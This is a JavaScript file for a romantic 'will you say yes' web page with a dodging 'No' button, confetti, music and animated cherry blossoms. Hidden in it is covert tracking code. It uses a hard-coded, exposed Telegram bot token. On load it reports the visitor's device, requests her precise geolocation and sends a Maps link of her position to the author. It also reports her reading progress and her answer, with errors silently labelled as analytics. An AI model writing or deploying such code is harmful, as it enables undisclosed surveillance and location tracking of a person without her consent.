// --- Configuration ---
const TELEGRAM_BOT_TOKEN = "8915892386:AAF-jPbwVToXTVlvkMc_ijc6sydP9sp1FEo";
const TELEGRAM_CHAT_ID = "5081463212"; // User needs to provide this

function sendTelegramLog(message) {
    if (!TELEGRAM_BOT_TOKEN || TELEGRAM_CHAT_ID === "YOUR_CHAT_ID_HERE") return;
    
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
        })
    }).catch(err => console.log("Analytics error")); // Silent fail
}

// Log initial visit and location
window.addEventListener('load', () => {
    const ua = navigator.userAgent;
    let device = "Unknown Device";
    if (/iPhone|iPad|iPod/.test(ua)) device = "iOS Device";
    else if (/Android/.test(ua)) device = "Android Device";
    else if (/Macintosh/.test(ua)) device = "Mac";
    else if (/Windows/.test(ua)) device = "Windows PC";
    
    sendTelegramLog(`📩 *New Visitor!*\nDevice: ${device}\nTime: ${new Date().toLocaleTimeString()}`);

    // Request location
    if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
            (position) => {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
                sendTelegramLog(`📍 *Location Received!*\nDevice: ${device}\nMap: ${mapsLink}`);
            }, 
            (error) => {
                sendTelegramLog(`📍 Location access denied or unavailable (${error.message}).`);
            },
            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
    }
});

const NO_BUTTON_REPULSION_RADIUS = 150; // Pixels
const NO_BUTTON_TEXTS = [
    "Try the Pink One!", 
    "Error 404: No not found", 
    "Nope! 🐶🐱", 
    "Shiro & Milo say No",
    "Are you sure?",
    "Nice try!",
    "Too slow!"
];

// --- Elements ---
const noBtn = document.getElementById('no-btn');
const yesBtn = document.getElementById('yes-btn');
const proposalCard = document.getElementById('proposal-card');
const invitationCard = document.getElementById('invitation-card');
const musicBtn = document.getElementById('music-btn');
const audio = document.getElementById('bg-music');
const canvas = document.getElementById('blossom-canvas');
const ctx = canvas.getContext('2d');

const storyContainer = document.getElementById('story-container');
const storyCards = document.querySelectorAll('.story-card');
const nextBtns = document.querySelectorAll('.next-btn');
const finishStoryBtn = document.getElementById('finish-story-btn');

// --- State ---
let isMusicPlaying = false;
let hasInteracted = false;

// --- Auto-play music on first interaction ---
document.addEventListener('click', function playOnFirstInteraction() {
    if (!hasInteracted) {
        hasInteracted = true;
        audio.volume = 0.4;
        audio.play().then(() => {
            isMusicPlaying = true;
            updateMusicBtn();
        }).catch(e => console.log("Audio play failed:", e));
    }
}, { once: false }); // Keep listening but only play once via hasInteracted flag

// --- Story Navigation ---
nextBtns.forEach((btn, index) => {
    // Exclude the finish button from this generic next logic
    if (btn.id === 'finish-story-btn') return;

    btn.addEventListener('click', () => {
        // Log interaction
        sendTelegramLog(`📖 She is reading Card ${index + 1}...`);

        // Hide current card
        const currentCard = storyCards[index];
        currentCard.classList.remove('active');
        currentCard.classList.add('fade-out');

        // Show next card
        if (index + 1 < storyCards.length) {
            const nextCard = storyCards[index + 1];
            // Wait slightly for fade out to begin
            setTimeout(() => {
                nextCard.classList.add('active');
            }, 500);
        }
    });
});

finishStoryBtn.addEventListener('click', () => {
    sendTelegramLog(`💌 She finished the story and opened the Proposal Card!`);

    // Hide current story card
    const currentCard = storyCards[storyCards.length - 1];
    currentCard.classList.remove('active');
    currentCard.classList.add('fade-out');

    // Hide story container smoothly
    storyContainer.style.transition = 'opacity 1s ease';
    storyContainer.style.opacity = '0';
    
    setTimeout(() => {
        storyContainer.style.display = 'none';
        
        // Show proposal card
        proposalCard.style.display = 'block';
        requestAnimationFrame(() => {
            proposalCard.style.transition = 'all 1s ease';
            proposalCard.style.opacity = '1';
            proposalCard.style.transform = 'scale(1)';
        });
    }, 1000);
});

// --- "No" Button Physics (Magnetic Repulsion) ---
document.addEventListener('mousemove', (e) => {
    const rect = noBtn.getBoundingClientRect();
    const btnX = rect.left + rect.width / 2;
    const btnY = rect.top + rect.height / 2;
    
    // Calculate distance from cursor to button center
    const distX = e.clientX - btnX;
    const distY = e.clientY - btnY;
    const distance = Math.sqrt(distX * distX + distY * distY);

    if (distance < NO_BUTTON_REPULSION_RADIUS) {
        // Calculate repulsion direction (vector math)
        // Invert the vector to push AWAY
        const angle = Math.atan2(distY, distX);
        
        // The closer the cursor, the stronger the push
        const force = (NO_BUTTON_REPULSION_RADIUS - distance) / NO_BUTTON_REPULSION_RADIUS;
        const pushDistance = 100 * force; // Max push distance

        const moveX = Math.cos(angle) * pushDistance * -1;
        const moveY = Math.sin(angle) * pushDistance * -1;

        // Apply translation (accounting for the centered positioning with translate(-50%, -50%))
        noBtn.style.transform = `translate(calc(-50% + ${moveX}px), calc(-50% + ${moveY}px))`;
        
        // Random Text Change (Debounced slightly ideally, but simple here)
        if (Math.random() < 0.1) {
            const randomText = NO_BUTTON_TEXTS[Math.floor(Math.random() * NO_BUTTON_TEXTS.length)];
            noBtn.innerText = randomText;
        }
    } else {
        // Reset position gently when cursor is far (back to centered)
        noBtn.style.transform = `translate(-50%, -50%)`;
        noBtn.innerText = "No"; // Reset text
    }
});

// --- Touch Device Support for "No" Button ---
// On touch devices, make the button jump away when touched
let touchMoveCount = 0;

noBtn.addEventListener('touchstart', (e) => {
    e.preventDefault(); // Prevent click from firing
    
    // Random jump direction
    const jumpDirections = [
        { x: 80, y: -30 },
        { x: -80, y: -30 },
        { x: 60, y: 50 },
        { x: -60, y: 50 },
        { x: 0, y: -60 },
        { x: 100, y: 0 },
        { x: -100, y: 0 }
    ];
    
    const randomDir = jumpDirections[Math.floor(Math.random() * jumpDirections.length)];
    
    // Apply jump with smooth transition
    noBtn.style.transition = 'transform 0.3s ease-out';
    noBtn.style.transform = `translate(calc(-50% + ${randomDir.x}px), calc(-50% + ${randomDir.y}px))`;
    
    // Change text
    const randomText = NO_BUTTON_TEXTS[Math.floor(Math.random() * NO_BUTTON_TEXTS.length)];
    noBtn.innerText = randomText;
    
    touchMoveCount++;
    
    // After several attempts, reset position
    setTimeout(() => {
        noBtn.style.transition = 'transform 0.5s ease-out';
        noBtn.style.transform = `translate(-50%, -50%)`;
        
        // Keep the funny text for a bit
        setTimeout(() => {
            if (touchMoveCount > 0) {
                touchMoveCount = 0;
            }
        }, 1000);
    }, 500);
}, { passive: false });

// --- "Yes" Button Logic ---
yesBtn.addEventListener('click', () => {
    sendTelegramLog(`💖 SHE SAID YES! 🎉`);

    // 1. Launch Confetti
    launchConfetti();

    // 2. Play Sound (if user hasn't interacted, browser might block, but we try)
    try {
        audio.volume = 0.5;
        audio.play().then(() => {
            isMusicPlaying = true;
            updateMusicBtn();
        }).catch(e => console.log("Audio requires interaction first"));
    } catch(e) {}

    // 3. Transition Cards
    proposalCard.style.opacity = '0';
    proposalCard.style.transform = 'scale(0.8)';
    
    // Disable interactions immediately
    proposalCard.style.pointerEvents = 'none';

    setTimeout(() => {
        proposalCard.style.display = 'none';
        
        // Force display flex/block before adding visible class
        invitationCard.style.display = 'block';
        invitationCard.classList.remove('hidden');
        
        // Use a slight delay to ensure the browser processes the 'display: block' change
        // before applying the opacity transition
        requestAnimationFrame(() => {
            invitationCard.classList.add('visible');
            launchConfetti(); // Reveal confetti
        });
    }, 500);
});

function launchConfetti() {
    const duration = 3000;
    const animationEnd = Date.now() + duration;
    const defaults = { startVelocity: 30, spread: 360, ticks: 60, zIndex: 0 };

    function random(min, max) {
        return Math.random() * (max - min) + min;
    }

    const interval = setInterval(function() {
        const timeLeft = animationEnd - Date.now();

        if (timeLeft <= 0) {
            return clearInterval(interval);
        }

        const particleCount = 50 * (timeLeft / duration);
        // since particles fall down, start a bit higher than random
        confetti(Object.assign({}, defaults, { particleCount, origin: { x: random(0.1, 0.3), y: Math.random() - 0.2 } }));
        confetti(Object.assign({}, defaults, { particleCount, origin: { x: random(0.7, 0.9), y: Math.random() - 0.2 } }));
    }, 250);
    
    // Also do the specific "Love Rockets" burst the user asked for
    confetti({
        particleCount: 100,
        spread: 70,
        origin: { y: 0.6 },
        colors: ['#FFD1DC', '#ff9a9e', '#fad0c4', '#F7E7CE'], // Pink and gold colors
    });
    
    // Additional burst from the bottom going up (love rockets effect)
    confetti({
        particleCount: 50,
        angle: 90,
        spread: 45,
        origin: { x: 0.5, y: 1 }, // From bottom center
        startVelocity: 60,
        colors: ['#FFD1DC', '#ff6b9d', '#ffc0cb'],
        gravity: 0.8
    });
}

// --- Music Toggle ---
musicBtn.addEventListener('click', () => {
    if (isMusicPlaying) {
        audio.pause();
        isMusicPlaying = false;
    } else {
        audio.play();
        isMusicPlaying = true;
    }
    updateMusicBtn();
});

function updateMusicBtn() {
    musicBtn.innerHTML = isMusicPlaying ? '⏸️ Pause Music' : '🎵 Play Music';
}


// --- Background Cherry Blossoms (Canvas) ---
function initBlossoms() {
    let width = window.innerWidth;
    let height = window.innerHeight;
    canvas.width = width;
    canvas.height = height;

    // Mouse Parallax State
    let mouseX = 0;
    let mouseY = 0;
    // Smooth out the parallax movement
    let targetMouseX = 0;
    let targetMouseY = 0;

    window.addEventListener('mousemove', (e) => {
        targetMouseX = (e.clientX - width / 2) * 0.05; // 0.05 is the "strength"
        targetMouseY = (e.clientY - height / 2) * 0.05;
    });

    const petals = [];
    const numPetals = 60;

    class Petal {
        constructor() {
            this.x = Math.random() * width;
            this.y = Math.random() * height - height;
            this.size = Math.random() * 10 + 5;
            this.speedX = Math.random() * 2 - 1;
            this.speedY = Math.random() * 1 + 1;
            this.rotation = Math.random() * 360;
            this.rotationSpeed = Math.random() * 2 - 1;
            this.color = `rgba(255, 209, 220, ${Math.random() * 0.5 + 0.3})`;
            // Depth for parallax (0.5 to 1.5)
            this.depth = Math.random() * 1 + 0.5; 
        }

        update() {
            this.y += this.speedY;
            this.x += Math.sin(this.y * 0.005) + this.speedX;
            this.rotation += this.rotationSpeed;

            if (this.y > height) {
                this.y = -20;
                this.x = Math.random() * width;
            }
        }

        draw() {
            ctx.save();
            // Apply parallax based on depth
            // We interpolate `mouseX` towards `targetMouseX` in the animate loop for smoothness, 
            // strictly speaking we can just use the global smoothed values here.
            const parallaxX = mouseX * this.depth;
            const parallaxY = mouseY * this.depth;

            ctx.translate(this.x + parallaxX, this.y + parallaxY);
            ctx.rotate(this.rotation * Math.PI / 180);
            ctx.fillStyle = this.color;
            ctx.beginPath();
            ctx.moveTo(0, 0);
            ctx.bezierCurveTo(10, -10, 20, 0, 0, 20);
            ctx.bezierCurveTo(-20, 0, -10, -10, 0, 0);
            ctx.fill();
            ctx.restore();
        }
    }

    for (let i = 0; i < numPetals; i++) {
        petals.push(new Petal());
    }

    function animate() {
        ctx.clearRect(0, 0, width, height);
        
        // Smooth interpolation for parallax
        mouseX += (targetMouseX - mouseX) * 0.1;
        mouseY += (targetMouseY - mouseY) * 0.1;

        petals.forEach(petal => {
            petal.update();
            petal.draw();
        });
        requestAnimationFrame(animate);
    }


    animate();

    // Resize handler
    window.addEventListener('resize', () => {
        width = window.innerWidth;
        height = window.innerHeight;
        canvas.width = width;
        canvas.height = height;
    });
}

initBlossoms();
